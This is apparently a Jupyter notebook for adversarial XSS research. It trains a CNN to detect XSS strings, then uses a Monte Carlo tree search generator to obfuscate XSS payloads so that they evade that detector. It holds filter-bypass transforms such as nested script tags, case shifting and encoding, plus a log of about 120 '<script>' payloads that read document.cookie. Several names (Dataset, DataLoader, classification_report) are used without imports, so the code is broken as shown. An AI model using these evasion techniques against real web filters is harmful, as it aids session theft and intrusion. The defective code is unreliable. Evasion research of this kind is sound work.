# %% [markdown]
# <a href="https://colab.research.google.com/github/8sheeta8/Attack_Network_AI/blob/main/XSS(8sheeta8)/XSS.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %%
# ✅ 개선 포인트 반영: MCTS-T UCB 수식 + AlexNet depth 확장

import torch
import torch.nn as nn
import torch.nn.functional as F
import numpy as np
import random
import os
from torchvision import transforms

# ✅ GPU/CPU 자동 선택
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
print("사용 장치:", device)

# ✅ 1. 업로드된 npy 파일을 불러오는 Dataset 클래스
class XSSDataset(Dataset):
    def __init__(self, image_path, label_path):
        self.images = np.load(image_path).astype(np.float32) / 255.0
        self.labels = np.load(label_path).astype(np.int64)

        if len(self.images.shape) == 3:
            self.images = self.images[:, np.newaxis, :, :]  # (N, 1, 16, 16)

    def __len__(self):
        return len(self.labels)

    def __getitem__(self, idx):
        return torch.tensor(self.images[idx]), torch.tensor(self.labels[idx])

# ✅ 2. DataLoader 생성 함수
def create_dataloader_from_files(img_path, label_path, batch_size=32, shuffle=False):
    dataset = XSSDataset(img_path, label_path)
    return DataLoader(dataset, batch_size=batch_size, shuffle=shuffle)


# ✅ 1. 개선된 AlexNet 기반 Discriminator (구조 확장)
class DiscriminatorAlexNet(nn.Module):
    def __init__(self):
        super(DiscriminatorAlexNet, self).__init__()
        self.features = nn.Sequential(
            nn.Conv2d(1, 64, kernel_size=3, padding=1),
            nn.ReLU(inplace=True),
            nn.MaxPool2d(2),

            nn.Conv2d(64, 128, kernel_size=3, padding=1),
            nn.ReLU(inplace=True),
            nn.MaxPool2d(2),

            nn.Conv2d(128, 256, kernel_size=3, padding=1),
            nn.ReLU(inplace=True),
        )

        self.classifier = nn.Sequential(
            nn.Flatten(),
            nn.Linear(256 * 4 * 4, 512),
            nn.ReLU(inplace=True),
            nn.Linear(512, 2)
        )

    def forward(self, x):
        x = self.features(x)
        x = self.classifier(x)
        return x

# ✅ 4. 학습 함수
def train_discriminator(model, train_loader, val_loader, epochs=10, lr=1e-3):
    model.to(device)
    optimizer = torch.optim.Adam(model.parameters(), lr=lr)
    criterion = nn.CrossEntropyLoss()

    for epoch in range(epochs):
        model.train()
        total_loss = 0
        correct = 0
        total = 0

        for x, y in train_loader:
            x, y = x.to(device), y.to(device)

            optimizer.zero_grad()
            out = model(x)
            loss = criterion(out, y)
            loss.backward()
            optimizer.step()

            total_loss += loss.item()
            pred = out.argmax(dim=1)
            correct += (pred == y).sum().item()
            total += y.size(0)

        acc = correct / total
        print(f"Epoch {epoch+1}/{epochs} | Loss: {total_loss:.4f} | Train Acc: {acc:.4f}")

        # 검증 정확도 출력
        model.eval()
        with torch.no_grad():
            correct = 0
            total = 0
            for x, y in val_loader:
                x, y = x.to(device), y.to(device)
                out = model(x)
                pred = out.argmax(dim=1)
                correct += (pred == y).sum().item()
                total += y.size(0)
            val_acc = correct / total
        print(f"           >> Val Acc: {val_acc:.4f}")

# ✅ 5. 테스트 평가 함수
def evaluate_model(model, test_loader):
    model.eval()
    preds = []
    targets = []
    with torch.no_grad():
        for x, y in test_loader:
            x = x.to(device)
            out = model(x)
            pred = out.argmax(dim=1).cpu().numpy()
            preds.extend(pred)
            targets.extend(y.numpy())

    print("\n✅ 최종 테스트 결과:")
    print(classification_report(targets, preds, target_names=["Normal", "XSS"]))

# ✅ 6. 파일 경로 지정 후 실행
train_loader = create_dataloader_from_files("train_images.npy", "train_labels.npy", shuffle=True)
val_loader = create_dataloader_from_files("val_images.npy", "val_labels.npy")
test_loader = create_dataloader_from_files("test_images.npy", "test_labels.npy")

model = DiscriminatorAlexNet()
train_discriminator(model, train_loader, val_loader, epochs=15, lr=1e-3)
evaluate_model(model, test_loader)
# Out:
# 사용 장치: cpu
# Epoch 1/15 | Loss: 4.6255 | Train Acc: 0.9556
#            >> Val Acc: 1.0000
# Epoch 2/15 | Loss: 4.4067 | Train Acc: 0.9807
#            >> Val Acc: 1.0000
# Epoch 3/15 | Loss: 0.2487 | Train Acc: 0.9992
#            >> Val Acc: 1.0000
# Epoch 4/15 | Loss: 0.4239 | Train Acc: 0.9983
#            >> Val Acc: 1.0000
# Epoch 5/15 | Loss: 0.5897 | Train Acc: 0.9983
#            >> Val Acc: 1.0000
# Epoch 6/15 | Loss: 0.0050 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 7/15 | Loss: 0.0002 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 8/15 | Loss: 0.0000 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 9/15 | Loss: 0.0000 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 10/15 | Loss: 0.0000 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 11/15 | Loss: 0.0000 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 12/15 | Loss: 0.0000 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 13/15 | Loss: 0.0000 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 14/15 | Loss: 0.0000 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
# Epoch 15/15 | Loss: 0.0000 | Train Acc: 1.0000
#            >> Val Acc: 1.0000
#
# ✅ 최종 테스트 결과:
#               precision    recall  f1-score   support
#
#       Normal       1.00      1.00      1.00       134
#          XSS       1.00      1.00      1.00       123
#
#     accuracy                           1.00       257
#    macro avg       1.00      1.00      1.00       257
# weighted avg       1.00      1.00      1.00       257

# %% [markdown]
#  1단계: 우회 기법 (Action) 정의

# %%
import random
import urllib.parse

def insert_comment(tag):
    return tag.replace("<", "<!-- -->") if "<" in tag else tag

def url_encode(tag):
    return urllib.parse.quote(tag)

def split_tag(tag):
    if "<script>" in tag:
        return tag.replace("<script>", "<scr<script>ipt>")
    return tag

def case_shift(tag):
    return ''.join(c.upper() if random.random() < 0.5 else c.lower() for c in tag)

def space_injection(tag):
    return tag.replace("<", "< ").replace(">", " >")

# ✅ 3. 문자열에 위치+행동 적용
obfuscation_actions = [
    lambda s: s.replace('<', '<!-- -->') if '<' in s else s,
    lambda s: urllib.parse.quote(s),
    lambda s: s.replace("<script>", "<scr<script>ipt>") if "<script>" in s else s,
    lambda s: ''.join(c.upper() if random.random() < 0.5 else c.lower() for c in s),
    lambda s: s.replace('<', '< ').replace('>', ' >')
]

def apply_action(text, pos, action_fn):
    if pos >= len(text):
        return text
    part = text[pos:]
    transformed = action_fn(part)
    return text[:pos] + transformed

# %% [markdown]
# 2단계: MCTS-T 노드 구조 정의

# %%
import numpy as np

# ✅ 2. 개선된 MCTS-T 구조 및 UCB-T 수식
class MCTSTNode:
    def __init__(self, xss_string, pos=None, act=None, parent=None):
        self.xss = xss_string
        self.pos = pos
        self.act = act
        self.parent = parent
        self.children = []
        self.visits = 0
        self.reward = 0.0

    def is_leaf(self):
        return len(self.children) == 0

    def expand(self, actions, max_pos):
        for pos in range(min(max_pos, len(self.xss))):
            for act in actions:
                new_str = apply_action(self.xss, pos, act)
                child = MCTSTNode(new_str, pos, act.__name__, parent=self)
                self.children.append(child)

    def ucb_score(self, C1=1.0, C2=1.0):
        if self.visits == 0:
            return float('inf')
        parent_visits = self.parent.visits if self.parent else 1
        return (self.reward / self.visits) + C1 * np.sqrt(np.log(parent_visits) / self.visits)

# %% [markdown]
#  3단계: MCTS 탐색 알고리즘 -

# %%
def select_promising_node(node):
    while not node.is_leaf():
        node = max(node.children, key=lambda n: n.ucb_score())
    return node

def backpropagate(node, reward):
    while node is not None:
        node.visits += 1
        node.reward += reward
        node = node.parent

# %% [markdown]
# 4단계: 보상 평가 함수 (Discriminator 활용)

# %%
import torch

# ✅ 4. 문자열 → 이미지 변환

def string_to_image_matrix(text, max_len=256):
    arr = np.zeros((16, 16), dtype=np.uint8)
    for i, c in enumerate(text[:max_len]):
        arr[i // 16][i % 16] = ord(c) if ord(c) < 256 else 0
    return arr

# ✅ 5. 보상 평가 (Discriminator 속이기)

def calculate_reward(discriminator_model, xss_string, device):
    matrix = string_to_image_matrix(xss_string)
    tensor = torch.tensor(matrix, dtype=torch.float32).unsqueeze(0).unsqueeze(0).to(device) / 255.0
    model = discriminator_model.eval().to(device)
    with torch.no_grad():
        output = model(tensor)
        prob = torch.softmax(output, dim=1)[0][0].item()
    return prob

# %% [markdown]
# 5단계: 전체 Generator 실행

# %%
# ✅ 6. 개선된 Generator 실행

def generate_obfuscated_xss(xss, model, device, max_iter=20):
    root = MCTSTNode(xss)

    for _ in range(max_iter):
        node = root
        while not node.is_leaf():
            node = max(node.children, key=lambda n: n.ucb_score())

        if node.visits == 0:
            reward = calculate_reward(model, node.xss, device)
            backpropagate(node, reward)
        else:
            node.expand(obfuscation_actions, max_pos=5)
            if node.children:
                child = random.choice(node.children)
                reward = calculate_reward(model, child.xss, device)
                backpropagate(child, reward)

    # 가장 좋은 우회 결과 선택
    leaf_nodes = []
    def collect_leaves(n):
        if n.is_leaf():
            leaf_nodes.append(n)
        else:
            for c in n.children:
                collect_leaves(c)
    collect_leaves(root)
    best = max(leaf_nodes, key=lambda n: n.reward / (n.visits + 1e-6))
    return best.xss

def backpropagate(node, reward):
    while node is not None:
        node.visits += 1
        node.reward += reward
        node = node.parent

# %% [markdown]
# 실행

# %%
def generate_all_obfuscated_xss(input_path, output_path, discriminator_model, max_iter=30, device="cpu"):
    with open(input_path, "r", encoding="utf-8") as f:
        original_samples = [line.strip() for line in f if line.strip()]

    print(f"총 {len(original_samples)}개 XSS 문자열 우회 생성 시작...")

    obfuscated_list = []
    for i, xss in enumerate(original_samples):
        print(f"\n[{i+1}/{len(original_samples)}] 원본: {xss}")

        # ✅ 여기에서 device 인자를 넘기지 않아 생긴 오류 → 수정!
        obf = generate_obfuscated_xss(xss, discriminator_model, max_iter=max_iter, device=device)
        obfuscated_list.append(obf)

    # 저장
    with open(output_path, "w", encoding="utf-8") as f:
        for obf in obfuscated_list:
            f.write(obf + "\n")

    print(f"\n✅ 모든 우회 문자열 저장 완료 → {output_path}")

# %%
generate_all_obfuscated_xss(
    input_path="generator_input.txt",
    output_path="generator_output.txt",
    discriminator_model=model,
    max_iter=30,
    device=device     # ✅ 이 줄 추가!
)
# Out:
# 총 874개 XSS 문자열 우회 생성 시작...
#
# [1/874] 원본: <script>console.log('BLV5DIBIS87PYKBE1QQHCJ22ET7LUGGUCPP9OTYYPSB697X2E7');console.log(document.cookie);</script>
#
# [2/874] 원본: <script>console.log('4IX6WF7YU8XE4XV7F78KR868GYBVZ8SLVEBA2WMLHD1NKP7ZVK');console.log(document.cookie);</script>
#
# [3/874] 원본: <script>console.log('9PRBGN0KXTIRDJWTY9DKY8IVZKIUDMTHH8PCBZ6PM37OLPFVG4');console.log(document.cookie);</script>
#
# [4/874] 원본: <script>console.log('WPV1RRR4KHVU03DRW4HYNUYSNCSXSXHPHM6PYQZVFYOV8H4KNQ');console.log(document.cookie);</script>
#
# [5/874] 원본: <script>console.log('2CBJ75LBD30SXIF6MLVV3UGZZKJNW3MZXSYLSUIHRM8JU2740F');console.log(document.cookie);</script>
#
# [6/874] 원본: <script>console.log('05WXMDQYHK5Q3D6GYEW7V8IM3UYHIMFOEIAZVE5R65PZL9U5RU');console.log(document.cookie);</script>
#
# [7/874] 원본: <script>console.log('L6OI4KXBDJAJE8IK4NYPSSD1XZTAFF7F3HBO78B92UC567POSO');console.log(document.cookie);</script>
#
# [8/874] 원본: <script>console.log('QGK8G8RA33TIM7J51IUWN9DBLUSM0ETCHNJNHAAB17A8ZSS191');console.log(document.cookie);</script>
#
# [9/874] 원본: <script>console.log('YALJTURZHIW5HE8YHE69BGG8UYBCL708W474V406I9KBG65H7Z');console.log(document.cookie);</script>
#
# [10/874] 원본: <script>console.log('WDFO6A9LFMN1DSRDJIYN1FWAXYOPCRHO896TKSV4WONVLL65R1');console.log(document.cookie);</script>
#
# [11/874] 원본: <script>console.log('3FAV4J4Q4J8ATJT7KOP2F99OVOGGT0V3ZZMYEOEZPAUJE49OYE');console.log(document.cookie);</script>
#
# [12/874] 원본: <script>console.log('2PVB2IUCZ3QPH7ZOSQV3H9S6Z6U292NH9569T3LT7WWEUGBF6Z');console.log(document.cookie);</script>
#
# [13/874] 원본: <script>console.log('RS7GDWODIASI51T2294CKMST1RI0X0EYI0IXLD6OKU1FN7FFRS');console.log(document.cookie);</script>
#
# [14/874] 원본: <script>console.log('W89CGMMK62E1GV49DBL7ONL9U5GBA4NZGY3S7GH4NZFLRIA8Y4');console.log(document.cookie);</script>
#
# [15/874] 원본: <script>console.log('NQP9NIXMDV6R1KS5VZXRGLOINY6GLAVGORZ78KX57QML5M4LKQ');console.log(document.cookie);</script>
#
# [16/874] 원본: <script>console.log('8RX9CMTFK1Q8NBICVGXSMZQVAC8GV98FDVGQ4IL2RUYKAIDWQ6');console.log(document.cookie);</script>
#
# [17/874] 원본: <script>console.log('WAMPEBQCWGNOLZAPBL7VTY7HCIZDIFZ3QLD0CKLY37IN5JTUEA');console.log(document.cookie);</script>
#
# [18/874] 원본: <script>console.log('WOTQT2NC6A9ZG57NK0EDNC1DUCIYKUF1K6KJ48T09PWIMPVHLG');console.log(document.cookie);</script>
#
# [19/874] 원본: <script>console.log('PG5I5CY8V37HR0DQ9OAEKZ871KG22KXSUR4994YALYGU3GIYRR');console.log(document.cookie);</script>
#
# [20/874] 원본: <script>console.log('0BD8TMDNJ0T3FFK3890XRM5X5N3KLM44O4ST5NST7WG7XSXNTQ');console.log(document.cookie);</script>
#
# [21/874] 원본: <script>console.log('2JL6WH4Z06OV182ZEXKMG045QWGSI84FJ0QB3V4RVOFU3MA4EX');console.log(document.cookie);</script>
#
# [22/874] 원본: <script>console.log('C68CQEEJGR90P7FOGIW5UNLNAY5VUFY5HJ4H7HF044FEIYW1NL');console.log(document.cookie);</script>
#
# [23/874] 원본: <script>console.log('IM5P8ZBU13AX6LYH55GTDSW39ARPDUMODWYL3W41N9LQALMZFR');console.log(document.cookie);</script>
#
# [24/874] 원본: <script>console.log('6G3Z53O372DILG22HB7XVJBHEKGM4CI10V925N1E8YH11ALUAM');console.log(document.cookie);</script>
#
# [25/874] 원본: <script>console.log('WNRON60D3UVZGDRBQ9AP9IYXRAHGNR87XNEOS1TUC437UAW3ZX');console.log(document.cookie);</script>
#
# [26/874] 원본: <script>console.log('MPMDSL7JFOJBBHIIXAW1RBW9AUWERPZF1PGQVTAKCA93IKK9KP');console.log(document.cookie);</script>
#
# [27/874] 원본: <script>console.log('SJBLOE5DZ6NAIQS6XZV5VXPATIQKSKUNWJYUHQEY7SZ3MGIK1T');console.log(document.cookie);</script>
#
# [28/874] 원본: <script>console.log('1GSB4HQAP0NBQC0ODZD420WU8PSHAOJBJUCHIYF6UA9B7WR8NL');console.log(document.cookie);</script>
#
# [29/874] 원본: <script>console.log('ZO6C2LBBY42SFPLZMGVGE8PMJAHLTBAQ3P88I6FH6ATP1TYHUX');console.log(document.cookie);</script>
#
# [30/874] 원본: <script>console.log('54PM06LFQOJCB2KK8PBRACA05P2XSQVSN5OV8EKJ1P0E4AD7ZC');console.log(document.cookie);</script>
#
# [31/874] 원본: <script>console.log('OGL4NN1CWBSR73VRN12ZUCHOX8OSAH18ZFHA3HZLBS0UW1X3XR');console.log(document.cookie);</script>
#
# [32/874] 원본: <script>console.log('XYAH310SWMHQWQ7S8YXD375UGRBP501WUM2PJQ77OLQ4CU3KH5');console.log(document.cookie);</script>
#
# [33/874] 원본: <script>console.log('VV8NUVBFRWPMXM13XWLQY35VT6L2EYB5AL8L6CIOE14J468HF1');console.log(document.cookie);</script>
#
# [34/874] 원본: <script>console.log('T02TLH1ZX5CU0T3UU4OR47TLPXCSW4J0WAVANAY15PK4XAEUSL');console.log(document.cookie);</script>
#
# [35/874] 원본: <script>console.log('P2E2HAIDNIPBU358SNFXXLT0T3KLBL67Z6W2FE6ICVZXZ1HTHT');console.log(document.cookie);</script>
#
# [36/874] 원본: <script>console.log('H03YK8FS27AQY6673MF0MDH1KCMGMXLUC0JLNR5ERWLQKRO1AT');console.log(document.cookie);</script>
#
# [37/874] 원본: <script>console.log('1SYQD27Q6E6NBV0TEQA9GKMVFQA9PVXO2PC5R6ZDB2KDV4DBUI');console.log(document.cookie);</script>
#
# [38/874] 원본: <script>console.log('2QSW4M9XQEEOYEUD3VYRP48GO6PHFIIT8RIFN918AMWU860GCU');console.log(document.cookie);</script>
#
# [39/874] 원본: <script>console.log('LD4CKTW5USS857LFFXESSCTEUOBZ7EIR4G3NPXAJBAEPFUXGG4');console.log(document.cookie);</script>
#
# [40/874] 원본: <script>console.log('AMJ6M403OFJAKYORXO5BPF5ADR2AR1KZNWBRHAQOEPDFO5QDJQ');console.log(document.cookie);</script>
#
# [41/874] 원본: <script>console.log('3I4CBO6UWSEXUVNZ9C5K4MNN7TCLKTJN7BLWIPA1N87F46G5Y7');console.log(document.cookie);</script>
#
# [42/874] 원본: <script>console.log('ABANDQ0P0QQNFKMR7W36JHL04CUA0YUEHKVKRIORKSDFI90BH2');console.log(document.cookie);</script>
#
# [43/874] 원본: <script>console.log('KMPFVQLGL2AB8A52DPMJ02PH6LN970P86VKX2N0IZQEXHCV0NF');console.log(document.cookie);</script>
#
# [44/874] 원본: <script>console.log('D265UARNKHNOKFPVNM68JUDP9TDWAKLD9MQEKDLQ9YLYMDFBXF');console.log(document.cookie);</script>
#
# [45/874] 원본: <script>console.log('43JI30CAUN165JB8RDWN404VACGB5P7IJTU24KK6NWBIH4WIDC');console.log(document.cookie);</script>
#
# [46/874] 원본: <script>console.log('FIFNVJUAR0P8GH13F29I4D7T0TNMRYSE2A2B6DN6JE87O0AHAE');console.log(document.cookie);</script>
#
# [47/874] 원본: <script>console.log('AQ80NQUS4TAQLQVWHMAGXB11KUBK34NZA8RUUD143IFKQDS3P5');console.log(document.cookie);</script>
#
# [48/874] 원본: <script>console.log('F8SD5KMTGZ21OZ2VASUS67LTOJQYE67IB1MP88HFLFEZ27HPDQ');console.log(document.cookie);</script>
#
# [49/874] 원본: <script>console.log('U3RBVJHMI5V2FI60RRVT99ZB019MZYZ7LVI6FT1Z4QJJPPO7K2');console.log(document.cookie);</script>
#
# [50/874] 원본: <script>console.log('M6X60XF32D27OZ3LBAV10FSCIXU8NXQ7YI9ZHGS4PU0RN7X09J');console.log(document.cookie);</script>
#
# [51/874] 원본: <script>console.log('6QT5G6N6F0VGUUY6FHHLDLO79IFHVE7PRNO72M9UUYYWKGPQTD');console.log(document.cookie);</script>
#
# [52/874] 원본: <script>console.log('SBZ0EREBNHH4FCFA1QLB0Y6XZUG927ELO8RHG0P0C9BIMNY8PL');console.log(document.cookie);</script>
#
# [53/874] 원본: <script>console.log('6CHBNT13D9GD2GXRA4TU2OQW5VFJ0JG57ISBT2QH5L7FLUA0DZ');console.log(document.cookie);</script>
#
# [54/874] 원본: <script>console.log('0PF7GRGX62L580ZC6OTDL1YQN8IXJUTHD3RCZRGQGJJD34LUZR');console.log(document.cookie);</script>
#
# [55/874] 원본: <script>console.log('120502QR88FTCNKDPZY67ZDCHL380K01YSAJGZFIQFD92RGDLF');console.log(document.cookie);</script>
#
# [56/874] 원본: <script>console.log('VDU1IJ21EPTRRJ6A2XT2SCNC9MO0E13X3941HZJNP82147RZT6');console.log(document.cookie);</script>
#
# [57/874] 원본: <script>console.log('YU13P4DI79YC616HF031862AXB594UG1G1T4T6ZSK9E7VHYV1R');console.log(document.cookie);</script>
#
# [58/874] 원본: <script>console.log('APCXYANGU0BQA9K7NBQHVK1TXM48YZ50IWK3P85XL0T0WDWY12');console.log(document.cookie);</script>
#
# [59/874] 원본: <script>console.log('QH5GEJI9VWPPNBXXTDISLML2ENGAZK3A2R0QM7DB6IETYLNJC1');console.log(document.cookie);</script>
#
# [60/874] 원본: <script>console.log('LV41FSDCGOG4VATAVLO9DZEWNE1ZSP0CXLVMP9BXFUEWN7G4I2');console.log(document.cookie);</script>
#
# [61/874] 원본: <script>console.log('GP21KV14K8MVY0YNI6Y7KRJIYB7D5HX69PKY76KIIZHLFYDE5U');console.log(document.cookie);</script>
#
# [62/874] 원본: <script>console.log('2KJFORKUZDAXWDIISRXRK0D8P8EOQ5GMGLF8ISQZ9A1KRQKFJ7');console.log(document.cookie);</script>
#
# [63/874] 원본: <script>console.log('4QKIS1LED2SAXRQEPSWGZ897CZPMCD04RIOS7BYZ9YATHKDVK5');console.log(document.cookie);</script>
#
# [64/874] 원본: <script>console.log('9BV5VZWBCCKC90JTNU7NGELM3NXD29M7LJ8PXQ0XKPBYJ8EQ4W');console.log(document.cookie);</script>
#
# [65/874] 원본: <script>console.log('U3EY4IE362QVCQLJU68A979S6WFBLCSFX2420E5PR1QFJPNJOM');console.log(document.cookie);</script>
#
# [66/874] 원본: <script>console.log('W90H1MV3ZUFRF8NHXH9N9ZRQWA3S4A4JMDZP7600ASKWEYS1HD');console.log(document.cookie);</script>
#
# [67/874] 원본: <script>console.log('5E6KN6V2R5CFPYZW4L3WZ77E0CRLT23SJM5ZI4I5Z2XZJY7ZOX');console.log(document.cookie);</script>
#
# [68/874] 원본: <script>console.log('76A7L3H148W1NGO2S5P0UK2T0PFN0B06E4U395OPGRNPYUPPL0');console.log(document.cookie);</script>
#
# [69/874] 원본: <script>console.log('2GB9PU04ATS8UDHI2JDKAHZRT5JTH3BQ90CIC2QEAU3HZDYGQW');console.log(document.cookie);</script>
#
# [70/874] 원본: <script>console.log('0R03XSKNSK3PRW9UARNKJTFQTAKMGZX6I1PAJBKSBY4AJJ8VBV');console.log(document.cookie);</script>
#
# [71/874] 원본: <script>console.log('BCQJGHIING9PC5BAUYQGOE1I84ICAGPV7OEA54ZL0GQ2KFP1WC');console.log(document.cookie);</script>
#
# [72/874] 원본: <script>console.log('G9J117BAF1E9ZI9GL1YKV2FSS2U7KDB2Z5HWXC4R61FIE9JXW8');console.log(document.cookie);</script>
#
# [73/874] 원본: <script>console.log('2G1657H3GSDWJKCCK6QJM6ZHGUKIT8BZL4E8M0QM6Q7A26S2X9');console.log(document.cookie);</script>
#
# [74/874] 원본: <script>console.log('AENPT32Z8RRSHAI1CJ1I3CH2EOSCM04KKL0LL49C6ML79RT606');console.log(document.cookie);</script>
#
# [75/874] 원본: <script>console.log('RXPUZJZFGCH2B0IYXKMZ8MPLORFPNT0ZD2WEEBHD1VPCCOGCCL');console.log(document.cookie);</script>
#
# [76/874] 원본: <script>console.log('RWE9EU6V1YBZ10ECA6LVYB8K9MJPYTD2ZT08MJA1MFX64YT8GL');console.log(document.cookie);</script>
#
# [77/874] 원본: <script>console.log('NEXT92JGYVMBXNOHNQSE1FU7PDOMGQ7GF7SH794X7S6WEBNUTR');console.log(document.cookie);</script>
#
# [78/874] 원본: <script>console.log('EBOZ1IWX2JB65BDRKVQM8HTO43AB1H6BSEHYN1JJ6K4NKGMOQ2');console.log(document.cookie);</script>
#
# [79/874] 원본: <script>console.log('HGWAKE8P711HR7Y6SE5QWQYYMVJ9ORZDVBWPZ80A70L6AD8V5R');console.log(document.cookie);</script>
#
# [80/874] 원본: <script>console.log('5BDJ2LSLVUI72M7USERQEQ28NMZB0VVRH76E9AKTRW40XQMUC0');console.log(document.cookie);</script>
#
# [81/874] 원본: <script>console.log('AMP90R6NDA71JUKO5TBTT1ET8H2MHEPGUBU9JPFO2FM37NKS5U');console.log(document.cookie);</script>
#
# [82/874] 원본: <script>console.log('D6QV0C0EPZAJ2M4KJKJ4KM0U8DGYJAWBL3M85NHKSM2MOMKCRD');console.log(document.cookie);</script>
#
# [83/874] 원본: <script>console.log('XUXNBN09GWZJ7G4VLL98I7TDOLCWMAYHFMW0XT1YL4YBVTPTQD');console.log(document.cookie);</script>
#
# [84/874] 원본: <script>console.log('NSBTKU2T7B7N77J81BLE9B7W8RNRCTNUXALOU8C68CHBQDKP8U');console.log(document.cookie);</script>
#
# [85/874] 원본: <script>console.log('ZI4BUFVJC52YPZ883E0QIESJRX1PBRTWPETCC4Z19M5ZHN5YF4');console.log(document.cookie);</script>
#
# [86/874] 원본: <script>console.log('3KWWDW4B44544NIEAWFCYFTHVISQDKHHVREVU9TPMOX3UJ61DI');console.log(document.cookie);</script>
#
# [87/874] 원본: <script>console.log('J1AF1HQURWM4RA6BMZXF8R4Y72GYYVTLSKCDRJ0EW8DUOFBX2X');console.log(document.cookie);</script>
#
# [88/874] 원본: <script>console.log('TWW7F7VQF2VGHJDV8GBBM4S2WXNCGV3CP7P74ZULKM6W4A3PDM');console.log(document.cookie);</script>
#
# [89/874] 원본: <script>console.log('7OZM52KKW693OLFH23KGTENQIDT7FKNTEPYC0XTQ6JG2ATC93X');console.log(document.cookie);</script>
#
# [90/874] 원본: <script>console.log('FVO8HBQVVN3B4D773Z2LPTBNXZTXZNB2Y506INNR0IWYPGSR9O');console.log(document.cookie);</script>
#
# [91/874] 원본: <script>console.log('8NYWY6R6VB5M7GT9BFUGZJTC4YAFS8WW7C047QRD42YAEN089P');console.log(document.cookie);</script>
#
# [92/874] 원본: <script>console.log('VS1C715Q2WUQ0P8CAVUSWKJH3UH4KNO330ONGHMAV6ATHPW9KN');console.log(document.cookie);</script>
#
# [93/874] 원본: <script>console.log('2F4IID09KXAJ19B1YNN3PBW0ISIKHYDU71BMDM494Y6SNGXI5I');console.log(document.cookie);</script>
#
# [94/874] 원본: <script>console.log('N2M8V1DGIVQE0OGMV822N72NKYV4EOUN6L0X1KTFUWYE01Q77P');console.log(document.cookie);</script>
#
# [95/874] 원본: <script>console.log('G4IG5P3WL4SEXGZ92OOYQ9BCDCQH4AI9QWXTS0KYQWX0OJ20DB');console.log(document.cookie);</script>
#
# [96/874] 원본: <script>console.log('FH12R4JOUAMGUE5L8CP4YP0B5UNUSD6R1E0E5SKWEHO9Z5N66L');console.log(document.cookie);</script>
#
# [97/874] 원본: <script>console.log('7UWXI0UPVT7KT22RYQK09K2A9RHQZB8G2DKVBO5VC6EUPTBWU8');console.log(document.cookie);</script>
#
# [98/874] 원본: <script>console.log('FLS9FVJ5V6CPVPYDZ528V2TYVI7SZD8411DROS9V6B04VQGBQJ');console.log(document.cookie);</script>
#
# [99/874] 원본: <script>console.log('QWFGP09DGRSE6R8TITZ5FBUAMDYMD0NBYT46D1AXJMUJJYOY8F');console.log(document.cookie);</script>
#
# [100/874] 원본: <script>console.log('VVQE0YUT1WZZSL0YN1KLDVEWFAXPK1ZMUIRB1XJUB5TAVMQ2VM');console.log(document.cookie);</script>
#
# [101/874] 원본: <script>console.log('J9QEX8ESN90YYJUMIHXD7B60B0RVXX9P4TL2NPA2Y5IT2HZIN9');console.log(document.cookie);</script>
#
# [102/874] 원본: <script>console.log('WHYJ43GMBQG8TBPFO2F9XT9P1VW9INBNM0JOG2ZRAP7IOHW98C');console.log(document.cookie);</script>
#
# [103/874] 원본: <script>console.log('37YAZFQCOJXQ6HTVN3WMDYOJ797I1T9F870ZVDH7VMX8S30SUH');console.log(document.cookie);</script>
#
# [104/874] 원본: <script>console.log('HSIP7HT7PRPUHWK6WYEB5BIQV88J93QCBYDPG7UJHBOYXRH0B0');console.log(document.cookie);</script>
#
# [105/874] 원본: <script>console.log('LU8U0DCETQ9O2I0O7AMTJVKHBPBSEDZZEEFM4TVXNDQ3A0AYSQ');console.log(document.cookie);</script>
#
# [106/874] 원본: <script>console.log('ZR9MW1DEGX25UBWV9HMOQ86UDC43HLOY5WSNVDTLEN0EG48ZUL');console.log(document.cookie);</script>
#
# [107/874] 원본: <script>console.log('NPDCLLYPJA38RPBBQRXVV1AC1I1D3V2Q3LLE66OB7AG46XLQNR');console.log(document.cookie);</script>
#
# [108/874] 원본: <script>console.log('C0XIQ5YGJB57WFILIJT4AT86OJ9CMDJA283FNM1ZLYDQ341LV0');console.log(document.cookie);</script>
#
# [109/874] 원본: <script>console.log('E274DQG1DJB9ZAEVQQ3ULXGGPDTV36J76I83KNX150L98UDH5S');console.log(document.cookie);</script>
#
# [110/874] 원본: <script>console.log('9042IO4AQJ57YXKRUINV60LO6HJ7P7Q8PBQTA61HPA1DZV74ZR');console.log(document.cookie);</script>
#
# [111/874] 원본: <script>console.log('Q9KGVMZTFHTKD4GNG3CRTIBO9V5B6QAIKWUOIIA73U6DCS6MXM');console.log(document.cookie);</script>
#
# [112/874] 원본: <script>console.log('LGOSGRZW7T9LRV8JO9PQXG8HS74QX86V270SM6LSB9YWB8W4PH');console.log(document.cookie);</script>
#
# [113/874] 원본: <script>console.log('DKYIRIOZWL44E34YPKSNKJCJZX05GPB09NKA8MQ79GD8UE0FGI');console.log(document.cookie);</script>
#
# [114/874] 원본: <script>console.log('28PHPMG8RHRYG5R3342C7RZXMNTIFN5K43FVT7I8JADQV197HL');console.log(document.cookie);</script>
#
# [115/874] 원본: <script>console.log('M96YZ3LQBQQ6DXBF54ACJT8HONVUTKP79A0LC67LFC4Z7YZUZ8');console.log(document.cookie);</script>
#
# [116/874] 원본: <script>console.log('78IVSPNWLGZP6GDPQ36VOCK24POL1Z7YA39OAN7NQCNU5W032S');console.log(document.cookie);</script>
#
# [117/874] 원본: <script>console.log('PUMXCEE2ZHKCAOXSFTV0104FX4497UD6M326QFN9MA0ZJCPCM3');console.log(document.cookie);</script>
#
# [118/874] 원본: <script>console.log('TA5I32XC1HMVKAQU0WHU3CBS5JVCBUWFCCUI6SPP21JTC6Y2SW');console.log(document.cookie);</script>
#
# [119/874] 원본: <script>console.log('1BOK7P4QT4X2KKKHX54S517H4834LUF7DH1U08FD14F881K3RS');console.log(document.cookie);</script>
#
# [120/874] 원본: <script>console.log('PYYDNGFFU8PGVSOUAXQANVQLUH7KYAVT4A4TKNBK8OMP6VX81R');console.log(document.cookie);</script>
#
